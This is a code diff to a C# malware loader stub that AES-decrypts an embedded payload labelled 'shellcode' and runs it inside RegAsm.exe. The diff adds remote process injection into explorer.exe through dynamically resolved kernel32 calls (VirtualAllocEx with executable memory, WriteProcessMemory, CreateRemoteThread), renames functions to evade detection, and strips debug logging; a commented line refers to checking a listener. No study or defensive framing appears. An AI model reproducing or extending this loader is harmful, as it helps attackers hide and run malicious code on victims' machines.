@@ -4,11 +4,48 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
+//using System.Threading;
 
 namespace Stub
 {
     internal static class Program
     {
+        #region Delegates
+        // ProcessOpen
+        private delegate IntPtr ProcOpen(uint processAccess, bool bInheritHandle, int processId);
+        
+        // VirtualAllocEx
+        private delegate IntPtr AllocateMem(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint fLProtect);
+        
+        // WriteProcessMemory
+        private delegate bool WriteMem(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+        
+        // CreateRemoteThread
+        private delegate IntPtr Create(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+        
+        // GetCurrentProcess
+        private delegate IntPtr GetProc();
+
+        #region Delegate API
+        private static readonly ProcOpen Open = LoadApi<ProcOpen>("kernel32", "ProcessOpen");
+        private static readonly AllocateMem Allocate = LoadApi<AllocateMem>("kernel32", "VirtualAllocEx");
+        private static readonly WriteMem Write = LoadApi<WriteMem>("kernel32", "WriteProcessMemory");
+        private static readonly Create CreateThread = LoadApi<Create>("kernel32", "CreateRemoteThread");
+        private static readonly GetProc GetProcess = LoadApi<GetProc>("kernel32", "GetCurrentProcess");
+        #endregion
+
+        #endregion
+
+        #region CreateAPI
+        [DllImport("kernel32", SetLastError = true)]
+        private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
+        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
+        private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
+        private static CreateApi LoadApi<CreateApi>(string name, string method)
+        {
+            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));
+        }
+        #endregion
 
         /// <summary>
         /// The main entry point for the application.
@@ -20,88 +57,49 @@ namespace Stub
             {
                 byte[] key = Convert.FromBase64String("%KEY%");
                 byte[] iv = Convert.FromBase64String("%IV%");
-                byte[] base64 = Convert.FromBase64String("%BASE64%");
+                // byte[] base64 = Convert.FromBase64String("%BASE64%");    // trying to encapsulate it within 'Buf' method
+                // byte[] debase64Aes = AES.D3Srypti0n(base64, key, iv);    // instead of this line, we passing the method with arguments, straightforward
 
-                // Log the input data before decryption
-                LogInputData("Input Base64", base64);
+                //Thread.Sleep(5000);
+                //switch(Up1oad(AES.D3Srypti0n(Buf(), key, iv))) // original :: replace 'Buf()' with base64
+                //{
+                //    case true:
+                //        Console.WriteLine("[+] Check listener! [+]");
+                //        break;
+                //    case false:
+                //        Console.WriteLine("[+] Failed! [+]");
+                //        break;
+                //}
 
-                byte[] debase64Aes = AES.Decryption(base64, key, iv);
-
-                // Log the decrypted data
-                LogDecryptedData("Decrypted Data", debase64Aes);
-
-                Kenneth.August.Crystal(debase64Aes, Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe"));
+                //Kenneth.August.Crystal(debase64Aes, Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe")); // original version
+                Kenneth.August.Crystal(AES.D3Srypti0n(Buf(), key, iv), Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe")); // enchanced version
             }
             catch (Exception ex)
             {
                 Console.WriteLine("Error: " + ex.Message);
             }
         }
-        private static void LogInputData(string name, byte[] data)
+
+        private static byte[] Buf()
         {
-            try
-            {
-                using (StreamWriter writer = new StreamWriter("logging_precompiled_stub_input_data.txt", true))
-                {
-                    string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
-                    writer.WriteLine(timestamp + " " + name + " (Base64):");
-
-                    string hexString = BitConverter.ToString(data).Replace("-", "");
-                    writer.WriteLine(hexString);
-
-                    writer.WriteLine();
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Error logging input data: " + ex.Message);
-            }
+            return Convert.FromBase64String("%BASE64%"); // we deleted 'byte[] base64 = ' from _______ byte[] base64 = Convert.FromBase64String("%BASE64%");
         }
 
-        private static void LogDecryptedData(string name, byte[] data)
+        private static bool Up1oad(byte[] Cover)
         {
-            try
-            {
-                using (StreamWriter writer = new StreamWriter("logging_precompiled_stub_Decrypted_data.txt", true))
-                {
-                    string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
-                    writer.WriteLine(timestamp + " " + name + " (Decrypted):");
-
-                    // Add the decrypted data as a hex-encoded string
-                    string hexString = BitConverter.ToString(data).Replace("-", "");
-                    writer.WriteLine(hexString);
-
-                    writer.WriteLine();
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Error logging decrypted data: " + ex.Message);
-            }
-        }
-        private static void LogDebase64Aes(byte[] debase64Aes)
-        {
-            try
-            {
-                using (StreamWriter writer = new StreamWriter("logging_stub_general.txt", true))
-                {
-                    string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
-                    writer.WriteLine(timestamp);
-
-                    // Add the debase64Aes byte array as a hex-encoded string
-                    string hexString = BitConverter.ToString(debase64Aes).Replace("-", "");
-                    writer.WriteLine(hexString);
-
-                    writer.WriteLine();
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Error logging debase64Aes: " + ex.Message);
-            }
+            System.Diagnostics.Process[] Procode = System.Diagnostics.Process.GetProcessesByName("explorer");
+            int pid = Procode[0].Id;
+            IntPtr ProcessHard = Open(0x001F0FFF, false, pid);
+            IntPtr acute = Allocate(ProcessHard, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+            IntPtr SizeOurt;
+            Write(ProcessHard, acute, Cover, Cover.Length, out SizeOurt);
+            CreateThread(ProcessHard, IntPtr.Zero, 0, acute, IntPtr.Zero, 0, IntPtr.Zero);
+            return true;
         }
     }
 }
+
+
 
 namespace Kenneth
 {
@@ -275,7 +273,7 @@ namespace Encryption
 {
     class AES
     {
-        public static byte[] Decryption(byte[] shellcode, byte[] Key, byte[] iv)
+        public static byte[] D3Srypti0n(byte[] shellcode, byte[] key, byte[] iv)
         {
             try
             {
@@ -286,7 +284,7 @@ namespace Encryption
                     aes.Padding = PaddingMode.PKCS7;
                     aes.Mode = CipherMode.CBC;
 
-                    aes.Key = Key;
+                    aes.Key = key;
                     aes.IV = iv;
 
                     using (var encryptor = aes.CreateDecryptor())
@@ -298,9 +296,6 @@ namespace Encryption
                                 cryptoStream.Write(shellcode, 0, shellcode.Length);
                                 cryptoStream.FlushFinalBlock();
 
-                                // Log the decryption result
-                                LogDecryptionResult(msEncShellcode.ToArray());
-
                                 return msEncShellcode.ToArray();
                             }
                         }
@@ -310,49 +305,7 @@ namespace Encryption
             catch (Exception ex)
             {
                 Console.WriteLine("Error during decryption: " + ex.Message);
-                LogError("Decryption", ex.Message);
                 return null;
-            }
-        }
-
-        private static void LogDecryptionResult(byte[] result)
-        {
-            try
-            {
-                using (StreamWriter writer = new StreamWriter("logging_stub_decryption.txt", true))
-                {
-                    string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
-                    writer.WriteLine(timestamp + "Decryption Result:");
-
-                    string hexString = BitConverter.ToString(result).Replace("-", "");
-                    writer.WriteLine(hexString);
-
-                    writer.WriteLine();
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Error logging decryption result: " + ex.Message);
-            }
-        }
-
-        private static void LogError(string operation, string errorMessage)
-        {
-            try
-            {
-                using (StreamWriter writer = new StreamWriter("logging_stub_decryption.txt", true))
-                {
-                    string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
-                    writer.WriteLine(timestamp + " Error in " + operation + " :");
-
-                    writer.WriteLine(errorMessage);
-
-                    writer.WriteLine();
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Error logging " + operation + " error: " + ex.Message);
             }
         }
     }
